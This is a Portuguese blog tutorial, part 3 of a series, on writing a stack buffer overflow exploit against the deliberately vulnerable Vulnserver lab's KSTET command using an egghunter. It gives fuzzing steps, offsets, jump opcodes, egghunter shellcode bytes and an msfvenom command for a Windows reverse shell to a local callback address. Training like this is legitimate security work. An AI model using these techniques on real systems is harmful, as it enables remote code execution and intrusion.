---
layout: post
title: 'Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter'
date: 2019-02-17 07:59:48.000000000 -03:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- Criação de Exploits
tags: []
meta:
  _edit_last: '1'
  _yoast_wpseo_content_score: '30'
  _yoast_wpseo_primary_category: '80'
  _aviaLayoutBuilder_active: ''
  _aviaLayoutBuilderCleanData: ''
  layout: ''
  sidebar: ''
  footer: ''
  header_title_bar: ''
  header_transparency: ''
  _avia_hide_featured_image: '0'
  _syntaxhighlighter_encoded: '1'
  _yoast_wpseo_metadesc: Como realizar um buffer overflow utilizando egghunter? Aprenda
    neste tutorial passo-a-passo como realizar um Buffer Overflow utilizando o EggHunter.
  _av_alb_posts_elements_state: a:0:{}
  _av_el_mgr_version: '1.0'
  _av_alb_element_mgr_version: 1.0.1
  _av_css_styles: a:6:{s:7:"post_id";i:1866;s:8:"css_file";s:13:"post-1866.css";s:9:"timestamp";s:0:"";s:6:"status";s:6:"no_css";s:13:"processed_ids";a:0:{}s:13:"include_posts";a:0:{}}
author: Helvio Junior (m4v3r1ck)







permalink: "/it/security/criacao-de-exploits/criacao-de-exploits-parte-3-estudo-de-caso-vulnserver-kstet-com-egghunter/"
---
<p>Ola pessoal,</p>
<p>Neste post vamos dar inicio a nossa análise de caso do Vulnserver KSTET. Como característica este servidor é vulnerável a stack buffer overflow mas com um buffer extremamente pequeno, 66 bytes. Sendo assim neste post abordaremos a utilização da técnica de egghunter, que basicamente consiste em encontrar e executar nosso shellcode (egg) em outra área de memória.</p>
<p><!--more--></p>
<h2>O Exploit</h2>
<h3>0x01 - Fuzzing</h3>
<p>Antes de mais nada precisamos encontrar a nossa vulnerabilidade. Para isso vamos realizar um processo de fuzzing em cima do vulnserver.</p>
<p>Antes de iniciar o fuzzing, vamos conhecer um pouco mais da aplicação. Ao conectar na aplicação ela nos mostra uma mensagem de boas vindas e sugerindo a execução do comando HELP.</p>
<p>[sourcecode language="shell"]# nc 172.30.200.66 9999<br />
Welcome to Vulnerable Server! Enter HELP for help.<br />
[/sourcecode]</p>
<p>Ao executar o comando HELP a aplicação nos retorna os comandos disponíveis</p>
<p>[sourcecode language="shell"]# nc 172.30.200.66 9999<br />
Welcome to Vulnerable Server! Enter HELP for help.<br />
HELP<br />
Valid Commands:<br />
HELP<br />
STATS [stat_value]<br />
RTIME [rtime_value]<br />
LTIME [ltime_value]<br />
SRUN [srun_value]<br />
TRUN [trun_value]<br />
GMON [gmon_value]<br />
GDOG [gdog_value]<br />
KSTET [kstet_value]<br />
GTER [gter_value]<br />
HTER [hter_value]<br />
LTER [lter_value]<br />
KSTAN [lstan_value]<br />
EXIT<br />
[/sourcecode]</p>
<p>Enquanto isso em sua console principal a aplicação mostra que ocorreu uma conexão</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/00-2019-02-16_124240.png"><img class="alignnone size-full wp-image-1874" src="{{ site.baseurl }}/assets/2019/02/00-2019-02-16_124240.png" alt="" width="682" height="348" /></a></p>
<p>Para o processo de fuzzing vamos utilizar a aplicação spike, como sempre ao conectar no servidor ele retorna essa mensagem de boas vindas temos que informar para o spike ler essa mensagem antes de enviar os comandos desejados.</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/01-fuzz.spk"></script></p>
<p>Usando este arquivo do spike (demonstrado acima) iremos realizar o fuzzing na porção kstet_value do comando depois de ler a mensagem de boas vindas. Anexe o vulnserver no Immunity Debugger e execute o comando abaixo:</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# generic_send_tcp 172.30.200.66 9999 01-fuzz.spk 0 0<br />
Total Number of Strings is 681<br />
Fuzzing<br />
Fuzzing Variable 0:0<br />
line read=Welcome to Vulnerable Server! Enter HELP for help.<br />
Fuzzing Variable 0:1<br />
Variablesize= 5004<br />
Fuzzing Variable 0:2<br />
Variablesize= 5005<br />
Fuzzing Variable 0:3<br />
Variablesize= 21<br />
^C<br />
[/sourcecode]</p>
<p>Logo na primeira interação (demonstrada abaixo) o vulnserver travou em nosso debug.</p>
<p>[sourcecode language="shell"]Fuzzing Variable 0:1<br />
Variablesize= 5004<br />
[/sourcecode]</p>
<p>Observe a saída do spike (demonstrada acima), ela nos diz que fou realizado o fuzzing na primeira variável (como os computadores iniciam em zero, nossa primeira variável é referenciada como 0). No outro lado dos dois pontos, podemos ver que temos a segunda interação do fuzzing representada pelo 1. Na outra linha o spike nos mostrou o tamanho do buffer que ele enviou, neste caso 5004 bytes. Agora podemos ver como isso ficou no Immunity Debugger:</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/01-2019-02-16_124535.png"><img class="alignnone size-full wp-image-1878" src="{{ site.baseurl }}/assets/2019/02/01-2019-02-16_124535.png" alt="" width="1120" height="956" /></a></p>
<p>Pode-se observar que o spike enviou a requisição conforme abaixo:</p>
<p>[sourcecode language="shell"]KSTET /.:/AAAAAAAAA........<br />
[/sourcecode]</p>
<p>Provavelmente 5000 A com o prefixo /.:/</p>
<p>Vamos duplicar este exploit em python criando então uma prova de conceito (PoC)</p>
<p>&nbsp;</p>
<h3>0x02 - Exploit de PoC</h3>
<p>Daqui para frente utilizaremos scripts Python para realizar todo nosso processo. Como ja sabemos nosso Overflow ocorreu com 5000 bytes + 4 caracteres <strong>/.:/ </strong>então vamos reproduzir isso:<strong><br />
</strong></p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/02-poc.py"></script></p>
<p>Executando nosso PoC temos a seguinte saída:</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# ./02-poc.py<br />
[*] Enviando requisicao maliciosa ...<br />
[/sourcecode]</p>
<p>E o crash ocorreu:<br />
<a href="{{ site.baseurl }}/assets/2019/02/01-2019-02-16_124535.png"><img class="alignnone size-full wp-image-1878" src="{{ site.baseurl }}/assets/2019/02/01-2019-02-16_124535.png" alt="" width="1120" height="956" /></a></p>
<p>Agora que temos uma prova de conceito funcional, vamos aprofundar e determinar o tipo de overflow (se é uma substituição simples do EIP, SEH e etc...) e em que offset isso ocorre.</p>
<h3>0x03 - Determinando o tipo de Exploit e o Offset de controle</h3>
<p>Olhando na imagem (do immunity Debugger) podemos observar que o registrador EIP foi substituido por:</p>
<p>[sourcecode language="shell"]41414141<br />
[/sourcecode]</p>
<p>Se você está lendo nossos posts de forma sequencial ou ja realizou uma outra exploração de Buffer Overflow sabe que A (maiúsculo) corresponde ao hexa 41. Bom! agora sabemos que temos um stacked buffer overflow de simples substituição do EIP, ou também conhecido como <em>vanilla EIP overwrite</em>. Agora precisamos saber em que ponto do nosso 5000 bytes está ocorrendo a substiruição do EIP. Vamos usar uma ferramenta da <em>metasploit</em> para gerar um buffer único e depois identificar em quem ponsto a substituição ocorreu.</p>
<p>Gerando o buffer único:</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# msf-pattern_create -l 5000<br />
[/sourcecode]</p>
<p>Agora basta copiar e colar este buffer em nosso arquivo python conforme demonstrado abaixo:</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/ 03-find_offset.py"></script></p>
<p>Execute este script e veja como ficou o registrador EIP:</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/03-2019-02-16_135338.png"><img class="alignnone size-full wp-image-1895" src="{{ site.baseurl }}/assets/2019/02/03-2019-02-16_135338.png" alt="" width="505" height="319" /></a></p>
<p>Agora basta usar o comando msf-pattern_offset com o valor de EIP para identificar a posição exata do buffer:</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# msf-pattern_offset -l 5000 -q 41326341<br />
[*] Exact match at offset 66<br />
[/sourcecode]</p>
<p>Isso indica que o EIP inicia no offset 66, ou seja, na posição 66, em outras palavras, temos 66 bytes de caracteres antes do EIP + 4 bytes do EIP e depois o restante do buffer. Vamos atualizar nosso exploit e verificar se temos o offset correto.</p>
<h3>0x04 - Verificando o Offset</h3>
<p>Vamos atualizar nosso exploit PoC com o tamanho do Offset conforme abaixo:<br />
<script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/ 04-checking_eip.py"></script></p>
<p>E executamos ele obtendo o resultado abaixo:</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/04-2019-02-16_135808-2.png"><img class="alignnone size-full wp-image-1892" src="{{ site.baseurl }}/assets/2019/02/04-2019-02-16_135808-2.png" alt="" width="1116" height="969" /></a></p>
<p>Isso indica que temos um exploit funcional que substituiu o EIP pelos nossos Bs, hexa 0x42, e que o ESP está apontado para o ponto exatamente posterior ao EIP, onde estão nossos Cs.</p>
<p>Porém olhando um pouco mais a fundo em nossa pilha de memória podemos ver que temos um numero limitado de Cs mesmo tendo enviado 500, este número é exatamente 20 bytes que pode ser calculado de 2 formas diferentes:</p>
<ol>
<li>Contando: Cada linha tem 4 bytes e no stack temos 5 linhas, então 4*5 = 20 bytes</li>
<li>Calculando: endereço inicial do stack 00FEF9F8, o primeiro caractere depois dos C está localizado em 00FEFA0C, então 00FEFA0C - 00FEF9F8 = 20 bytes</li>
</ol>
<p>Mas e dai que só tem 20 bytes? Isso indica que só teremos estes 20 bytes + os 66 bytes (antes do EIP) para realizar todo nosso processo de exploração, e um shellcode pequeno gerado pelo msfvenom tem pelo menos 354 bytes. Então teremos que ser criativos.</p>
<p><strong>Nota importante:</strong> Cuidado com os próximos passos para não continuar usando o buffer maior que 20 bytes após o endereço do EIP, pois isso causará problemas futuros.</p>
<h3>0x05 - Saltando para nosso Buffer</h3>
<p>O próximo passo em nosso processo de exploração será saltar para os nossos Cs, para isso precisaremos localizar um endereço de memória (sem o nullbyte 0x00) que faça o JMP ESP ou CALL ESP, podemos usar o script Mona para nos ajudar nessa tarefa. Note que vou utlizar o -n para ignorar os endereços iniciados por null byte.</p>
<p>[sourcecode language="shell"]!mona jmp -n -r ESP<br />
[/sourcecode]</p>
<p>Este comando nos retornou 9 opções</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/05-2019-02-17_095741.png"><img class="alignnone size-full wp-image-1897" src="{{ site.baseurl }}/assets/2019/02/05-2019-02-17_095741.png" alt="" width="1116" height="968" /></a></p>
<p>Porém a nossa escolha foi a primeira:</p>
<p>[sourcecode language="shell"]Log data, item 11<br />
 Address=625011AF<br />
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)<br />
[/sourcecode]</p>
<p>Por hora não conhecemos nenhum badchar, a não ser os classisos para um servidor baseado em comandos ASCII (0x00 - null byte, 0x0d - '\r', 0x0a - '\n'). Adicionamente este endereço não tem outras proteções como SafeSEH e ASLR e é uma DLL do proprio sistema, o que facilita as coisas pois não corre-se o risco do endereço se alterar com a mudança de sistema operacional.</p>
<p>Então vamos atualizar nosso exploit para realizar esse JMP ESP. Nele utilizaremos uma função chamada pack da biblioteca struct para alterar o endereço entre big endian e little endian.</p>
<p>Segue nosso exploit atualizado:</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/ 05-jumping-esp.py"></script></p>
<p>Antes de rodar nosso exploit novamente, no Immunity Debbuger clique no botão <strong><em>Goto address in Dissassembler </em></strong>demonstrado abaixo:</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150507.png"><img class="alignnone size-full wp-image-1899" src="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150507.png" alt="" width="1120" height="236" /></a></p>
<p>E digite o endereço da instrução JMP ESP escolhida:</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150539.png"><img class="alignnone size-full wp-image-1900" src="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150539.png" alt="" width="1120" height="274" /></a></p>
<p>Se certifique que está no endereço correto pois algumas vezes é necessário fazer este processo mais de uma vez para alcançar o endereço correto. Uma vez no endereço correto pressionne F2 para adicionar um breakpoint.</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150610.png"><img class="alignnone size-full wp-image-1901" src="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150610.png" alt="" width="1120" height="169" /></a></p>
<p>Agora execute o exploit e veja a aplicação parando no breakpoint selecionado</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/05-2019-02-17_101711.png"><img class="alignnone size-full wp-image-1903" src="{{ site.baseurl }}/assets/2019/02/05-2019-02-17_101711.png" alt="" width="1116" height="970" /></a></p>
<p>Observe que essa parada foi devido ao breakpoint, sabemos isso por causa do texto na barra de status "Breakpoint at essfunc.625011AF" e não outro erro como <em>access violation</em>.</p>
<p>Para dar continuidade pressione F7 (Step Into) para permitir o JMP para o endereço do ESP que por sua vez é a localização dos nossos Cs</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/05-2019-02-17_101916.png"><img class="alignnone size-full wp-image-1904" src="{{ site.baseurl }}/assets/2019/02/05-2019-02-17_101916.png" alt="" width="1116" height="969" /></a></p>
<h3>0x06 - Saltando para o buffer maior</h3>
<p>Até este ponto conseguimos saltar para o nosso ESP que é um buffer com 20 bytes, que não da p/ fazer quase nada, mas é mais que suficiente para que possamos fazer um salto para traz indo para nossos As que é um buffer um pouco maior (66 bytes)</p>
<p>Mas como fazemos isso? Há diversas formas, vamos explorar uma delas aqui, mas para isso precisamos saber onde estamos.</p>
<p>Olhando na imagem anterior vemos o seguinte cenário:</p>
<p>[sourcecode language="shell"]00EDF9F8   43               INC EBX<br />
[/sourcecode]</p>
<p>Estamos no endereço de memória 00EDF9F8. Mas onde está o início dos nossos As?</p>
<p>[sourcecode language="shell"]00EDF9B2   41               INC ECX<br />
[/sourcecode]</p>
<p>Então podemos fazer alguns cálculos para realizar a movimentação necessária</p>
<p>[sourcecode language="shell"]00EDF9F8 (Localização atual) - 00EDF9B2 (Posição desejada) = Valor em Hexa: 46 ou Valor em Decimal: 70<br />
[/sourcecode]</p>
<p>Para realizar os calculos do ESP de forma segura vamos colocar seu valor em EDX:</p>
<p>[sourcecode language="shell"]PUSH ESP<br />
POP EDX<br />
[/sourcecode]</p>
<p>E posteriormente subtrair 0x46 (decimal 70) de seu valor:</p>
<p>[sourcecode language="shell"]SUB EDX,0x46<br />
[/sourcecode]</p>
<p>E por fim saltar para o endereço desejado:</p>
<p>[sourcecode language="shell"]JMP EDX<br />
[/sourcecode]</p>
<p>Caso não esteja familiarizado o mestasploit tem uma ferramenta para nos ajudar neste processo de criação dos OPCODES chamada <em>msf-nasm_shell</em> conforme demonstrado abaixo:</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~# msf-nasm_shell<br />
nasm &amp;gt; PUSH ESP<br />
00000000  54                push esp<br />
nasm &amp;gt; SUB EDX,0x46<br />
00000000  83EA46            sub edx,byte +0x46<br />
nasm &amp;gt; JMP EDX<br />
00000000  FFE2              jmp edx<br />
nasm &amp;gt;<br />
[/sourcecode]</p>
<p>Segue abaixo o exploit atualizado:</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/06-stage1-option1.py"></script></p>
<p>Este é um dos métodos de realizar este processo, e o escolhido por mim neste exploit, porém há métodos mais econômicos do ponto de vista de consumo de espaço uma vez que temos somente 20 bytes. Como por exemplo o JUMP para 72 bytes para traz (70 bytes desejados + 2 consumido pela da instrução de JMP)</p>
<p>[sourcecode language="shell"]root@M4v3r1cK:~# msf-nasm_shell<br />
nasm &amp;gt; JMP short -72<br />
00000000  EBB6              jmp short 0xffffffb8<br />
nasm &amp;gt;<br />
[/sourcecode]</p>
<p>Segue abaixo a segunda opção:<br />
Note que como neste nosso exploit nesse primeiro estágio só precisamos realizar o salto para nosso segundo estágio (nossos As) não faz diferença no método utilizado, mas caso precisasse realizar outras operações nestes restritos 20 bytes essa segunda opção certamente seria a melhor opção.</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/06-stage1-option2.py"></script></p>
<p>Reiniciando o Immunity, redefinindo nosso breakpoint no commando JMP ESP e então pressionando F7 quando a execução parar no breakpoint chegaremos ao resultado abaixo:</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150857.png"><img class="alignnone size-full wp-image-1914" src="{{ site.baseurl }}/assets/2019/02/06-2019-02-16_150857.png" alt="" width="1120" height="955" /></a></p>
<p>Neste ponto temos pelo menos 2 formar de continuar com o exploit:</p>
<ol>
<li>Verificando a possibilidade de enviar o shellcode através de outro comando do servidor e buscando essa área de memória com egghunter</li>
<li>Reutilizando a função WS2_32.recv (que foi a função utilizada para ler nosso buffer inicial) para ler da nossa própria conexão um novo buffer (shellcode) e posteriormente executa-lo. Este processo está descrito no post <a href="https://www.helviojunior.com.br/it/security/criacao-de-exploits/criacao-de-exploits-parte-4-estudo-de-caso-vulnserver-kstet-com-reaproveitamento-da-funcao-ws2_32-recv/" target="_blank" rel="noopener noreferrer">Criação de Exploits – Parte 4 – Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv </a></li>
</ol>
<p>Neste post abordaremos a opção 1: utilização de egghunter.</p>
<p><strong>0x07 - PoC2 Localizando o Shellcode<br />
</strong></p>
<p>Antes de dar continuidade ao processo de exploit primeiramente precisamos entender se será possível enviar o nosso shellcode através de outro comando para o servidor. Após diversos testes encontrei a função GDOG do servidor que permite o envio de pelo menos 1000 bytes, mais que suficiente para a colocação do nosso shellcode.</p>
<p>Para facilitar nosso teste no lugar doa 66 As vou colocar 66 0xCC (breakpoint), para que a aplicação pare a execução nele e possamos analisar a memória. Adicionalmente foi colocado no script um envio do nosso pseudo shellcode antes no buffer que irá causar o overflow, conforme exemplificado abaixo:</p>
<p>[sourcecode language="shell"]shellcode  = b&quot;GDOG &quot;<br />
shellcode += &quot;T00WT00W&quot;<br />
shellcode += &quot;C&quot; * 1000</p>
<p>print &quot;[*] Enviando shellcode...&quot;</p>
<p>exp.recv(4096)<br />
exp.send(shellcode)</p>
<p>print &quot;[*] Enviando exploit...&quot;<br />
exp.recv(4096)<br />
exp.send(buffer)<br />
[/sourcecode]</p>
<p>Execute o exploit:<br />
<script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/07-poc2.py"></script></p>
<p>Note que como esperado a aplicação parou no breakpoint 0xCC:<br />
<a href="{{ site.baseurl }}/assets/2019/02/07-2019-02-17_182547.png"><img class="alignnone size-full wp-image-1973" src="{{ site.baseurl }}/assets/2019/02/07-2019-02-17_182547.png" alt="" width="1116" height="969" /></a></p>
<p>Com a ajuda do script mona podemos verificar se foi encontrado na memória</p>
<p>[sourcecode language="shell"]!mona find -s T00WT00W<br />
[/sourcecode]</p>
<p>&nbsp;</p>
<p><a href="{{ site.baseurl }}/assets/2019/02/07-2019-02-16_154941.png"><img class="alignnone size-full wp-image-1974" src="{{ site.baseurl }}/assets/2019/02/07-2019-02-16_154941.png" alt="" width="1120" height="234" /></a><br />
<a href="{{ site.baseurl }}/assets/2019/02/07-2019-02-16_155003.png"><img class="alignnone size-full wp-image-1977" src="{{ site.baseurl }}/assets/2019/02/07-2019-02-16_155003.png" alt="" width="1120" height="955" /></a></p>
<p>Bom! Se o mona foi capaz de achar um egghunter escrito por nós também será.</p>
<h3>0x08 - Egghunter</h3>
<p>Egghunter é uma técnica utilizada onde temos um código relativamente pequeno +- 45 bytes que tem sua principal função buscar na memória um 'egg' que é na verdade nosso shellcode. É muito comum neste tipo de estudo você ver o termo T00W ou W00T, ele é uma regra? Não, ele é o que geralmente usamos para fins acadêmicos, mas pode ser qualquer sequencia de 4 bytes que será utilizada para identificar o inicio do nosso shellcode.</p>
<p>O Egghunter proposto neste post executa se forma simplificada o seguinte fluxo:</p>
<ol>
<li>Define o endereço de memória inicial da busca e salta para o passo 4;</li>
<li>Incrementa 4Kb ao endereço de memória atual e segue para o passo 4;</li>
<li>Incrementa 1 byte ao endereço de memória atual;</li>
<li>Verifica se tem acesso ao endereço de memória; Se sim salta para o passo 5; caso não salta para o passo 2;</li>
<li>Verifica se no endereço atual existe 1 instância do nosso EGG (W00T); Se existe continua a execução para o passo 6; caso contrário salta para o passo 3;</li>
<li>Verifica se nos próximos 4 bytes existe mais 1 instância do nosso EGG (W00T); Se sim faz um JMP para o byte seguinte do WOOTWOOT; caso não salta para o passo 3;</li>
</ol>
<p>Então vamos o nosso egghunter</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/egghunter1.asm"></script></p>
<p>Para compilar ele e pegar o seu opcode para colocar em nosso python execute os comandos abaixo:</p>
<p>[sourcecode language="shell"]nasm egghunter1.asm -o egghunter -l egghunter.lst<br />
cat egghunter | msfvenom -p - -a x86 --platform win -e generic/none -f python<br />
[/sourcecode]</p>
<p>Tendo o seguinte resultado</p>
<p>[sourcecode language="shell"]Attempting to read payload from STDIN...<br />
Found 1 compatible encoders<br />
Attempting to encode payload with 1 iterations of generic/none<br />
generic/none succeeded with size 36 (iteration=0)<br />
generic/none chosen with final size 36<br />
Payload size: 36 bytes<br />
Final size of python file: 184 bytes<br />
buf =  &quot;&quot;<br />
buf += &quot;\x89\xca\xeb\x06\x66\x81\xca\xff\x0f\x42\x52\x6a\x02&quot;<br />
buf += &quot;\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57&quot;<br />
buf += &quot;\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;<br />
[/sourcecode]</p>
<p>Basta agora copiar este código para nosso exploit. Para facilitar nosso estudo fiz uma alteração no exploit adicionando um breakpoint antes da chamada JMP EDI ficando como abaixo:</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/08-egghunting.py"></script></p>
<p>Ao executar o nosso exploit ele irá parar na chamada no JMP EDI para que possamos verificar como estão nossos registradores, conforme imagem abaixo:<br />
<a href="{{ site.baseurl }}/assets/2019/02/08-2019-02-17_190440.png"><img class="alignnone size-full wp-image-1980" src="{{ site.baseurl }}/assets/2019/02/08-2019-02-17_190440.png" alt="" width="1116" height="969" /></a></p>
<p>Pode-se observar que o EDI aponta para o endereço de memória</p>
<p>[sourcecode language="shell"]0x0027437D<br />
[/sourcecode]</p>
<p>Que per sua vez é o endereço exatamente posterior ao endereço do W00TW00T, você deve ter percebido que na memória o W00TW00T aparece como T00WT00W, isso ocorre em virtude do endianess.</p>
<h3>0x09 - Aproveite o shell</h3>
<p>Agora basta alterar os Cs para o shellcode gerado pelo msfvenom e aproveitar.</p>
<p>Gere o shellcode com o comando abaixo, nele coloquei como badchars os clássicos nullbyte, \r e \n.</p>
<p>[sourcecode language="shell"]msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.177 lport=4444 -a x86 --platform win -e x86/alpha_mixed -b &quot;\x00\x0a\x0d&quot; -f python<br />
[/sourcecode]</p>
<p>Copie o conteúdo do buffer no exploit conforme arquivo abaixo e senha feliz!<br />
<script src="https://gist-it.appspot.com/github/helviojunior/vulnserver/blob/master/exploit1_egghunter/09-final.py"></script></p>
<p>&nbsp;</p>
